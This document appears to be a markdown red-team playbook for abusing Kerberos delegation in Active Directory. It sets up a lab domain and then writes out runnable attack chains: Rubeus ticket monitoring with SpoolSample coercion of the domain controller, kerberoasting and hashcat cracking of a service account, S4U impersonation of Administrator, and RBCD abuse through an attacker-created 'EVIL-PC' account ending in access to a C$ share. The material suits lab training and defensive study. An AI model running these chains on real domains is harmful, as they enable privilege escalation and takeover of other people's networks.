# Kerberos Delegation Abuse Playbook

---

## 1. Unconstrained Delegation Abuse

### 1.1 Enumeration

```powershell
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained

```

## 2. Create Labaratory

### 2.1 Laboratory setup

<img width="577" height="671" alt="image" src="https://github.com/user-attachments/assets/e7beee5c-0142-4f88-8b8d-dd7ae806a78d" />

---

```powershell
Do not trust this computer for delegation                         - Dont Have Delegation
Trust this computer for delegation to any service (Kerberos only) - Unconstrained Delegation
Trust this computer for delegation to specified services only     - Constrained Delegation

Use Kerberos only:
Use any authentication protocol
Resource-Based Constrained Delegation (RBCD)
```

# 2.2 Unconstrained Delegation
```powershell
Import-Module ActiveDirectory

# Create Computer Account - Under the Delegation OU
New-ADComputer -Name “UNCON-PC” -SAMAccountName “UNCON-PC” -Enabled $true `
    -Path “OU=Delegation,DC=warzone,DC=oxsium,DC=local”

# Enable unconstrained delegation (TRUSTED_FOR_DELEGATION flag)
Set-ADAccountControl -Identity “UNCON-PC$” -TrustedForDelegation $true

# Check
Get-ADComputer -Identity “UNCON-PC” -Properties TrustedForDelegation, userAccountControl
```
```powershell
Import-Module .\PowerView.ps1

# Monitor TGTs in the SYSTEM context (on UNCON-PC)
.\Rubeus.exe monitor /interval:5 /filteruser:Administrator

# Coercion: Force the Domain Controller to authenticate to UNCON-PC
.\SpoolSample.exe WIN-WARZONE.warzone.oxsium.local UNCON-PC.warzone.oxsium.local

# Inject the base64 ticket from the Rubeus monitor output
.\Rubeus.exe ptt /ticket:BASE64_TICKET_HERE
```

---
# 2.3 Constrained Delegation with Protocol Transition (S4U2Self + S4U2Proxy)
```powershell
Import-Module ActiveDirectory

# Create Service Account
New-ADUser -Name "unconstrained-svc" -SAMAccountName "unconstrained-svc" `
    -AccountPassword (ConvertTo-SecureString "sako2005!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true

# Set SPN
setspn -A HTTP/unconstrained-svc.warzone.oxsium.local unconstrained-svc

# Enable Constrained Delegation + Protocol Transition
Set-ADAccountControl -Identity "unconstrained-svc" -TrustedToAuthForDelegation $true
Set-ADUser -Identity "unconstrained-svc" -Add @{
    'msDS-AllowedToDelegateTo' = @("CIFS/WIN-WARZONE.warzone.oxsium.local","HTTP/WIN-WARZONE.warzone.oxsium.local")
}

# Check
Get-ADUser -Identity "unconstrained-svc" -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo, ServicePrincipalName
```

```powershell
Import-Module .\PowerView.ps1

# Find SPN-enabled accounts with PowerView
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Direct kerberoast with Rubeus
.\Rubeus.exe kerberoast /user:unconstrained-svc /outfile:hashes.txt

# Crack Hash
hashcat -m 13100 hashes.txt rockyou.txt

# Convert password to NTLM Hash
.\Rubeus.exe hash /password:sako2005! /user:unconstrained-svc /domain:warzone.oxsium.local

# The complete chain with Rubeus
.\Rubeus.exe s4u /user:unconstrained-svc /rc4:BURAYA_RC4_HASH `
    /impersonateuser:Administrator `
    /msdsspn:CIFS/WIN-WARZONE.warzone.oxsium.local `
    /ptt
```

# 2.4 Constrained Delegation without Protocol Transition ( Use Kerberos only )
```powershell
Import-Module ActiveDirectory

# Create Service Account
New-ADUser -Name "constrained-svc" -SAMAccountName "constrained-svc" `
    -AccountPassword (ConvertTo-SecureString "sako2005!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true

# Set SPN
setspn -A HTTP/constrained-svc.warzone.oxsium.local constrained-svc

# Constrained delegation, BUT WITHOUT PROTOCOL TRANSITION
# (TrustedToAuthForDelegation is not set - default remains False)
Set-ADUser -Identity "constrained-svc" -Add @{
    'msDS-AllowedToDelegateTo' = @("CIFS/WIN-WARZONE.warzone.oxsium.local","HTTP/WIN-WARZONE.warzone.oxsium.local")
}

# Check - TrustedToAuthForDelegation must be False
Get-ADUser -Identity "constrained-svc" -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo, ServicePrincipalName
```

# 2.5 Resource-Based Constrained Delegation (RBCD)
```powershell
Import-Module ActiveDirectory

# ============================================
# 1. Target computer account - under the Delegation OU
# ============================================
New-ADComputer -Name “RBCD-PC” -SAMAccountName “RBCD-PC” -Enabled $true `
    -Path “OU=Delegation,DC=warzone,DC=oxsium,DC=local”

# Manually add the CIFS SPN (it doesn't register automatically because it's not a real domain-joined computer)
setspn -A CIFS/RBCD-PC.warzone.oxsium.local RBCD-PC$

# Check - TrustedForDelegation is False, msDS-AllowedToActOnBehalfOfOtherIdentity is empty, SPN is present
Get-ADComputer -Identity “RBCD-PC” -Properties TrustedForDelegation, msDS-AllowedToActOnBehalfOfOtherIdentity, ServicePrincipalName
setspn -L RBCD-PC$
```
```powershell
# ============================================
# 2. An attacker-controlled computer account - in the same OU
# (run this in a lowpriv-user context to simulate a real scenario)
# ============================================
$ComputerName = “EVIL-PC”
$Password = ConvertTo-SecureString “Ev1lP@ss123!” -AsPlainText -Force

New-ADComputer -Name $ComputerName -SAMAccountName “$ComputerName$” `
    -AccountPassword $Password -Enabled $true `
    -Path “OU=Delegation,DC=warzone,DC=oxsium,DC=local”

# Find the SID of EVIL-PC$
$evilSID = Convert-NameToSid EVIL-PC$

# Set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of RBCD-PC to point to EVIL-PC$
Set-ADComputer -Identity “RBCD-PC” -PrincipalsAllowedToDelegateToAccount “EVIL-PC$”

# Check
$rbcd = Get-ADComputer -Identity “RBCD-PC” -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
$rbcd.‘msDS-AllowedToActOnBehalfOfOtherIdentity’.Access

# ============================================
# 3. Attack chain - Rubeus with S4U2Self + S4U2Proxy
# ============================================

# Convert the password to an NTLM hash
.\Rubeus.exe hash /password:Ev1lP@ss123! /user:EVIL-PC$ /domain:warzone.oxsium.local

# Full chain - Replace BURAYA_RC4_HASH with the rc4_hmac value from the output above
.\Rubeus.exe s4u /user:EVIL-PC$ /rc4:BURAYA_RC4_HASH `
    /impersonateuser:Administrator `
    /msdsspn:CIFS/RBCD-PC.warzone.oxsium.local `
    /domain:warzone.oxsium.local `
    /ptt

# Verification
klist
ls \\RBCD-PC.warzone.oxsium.local\C$
```
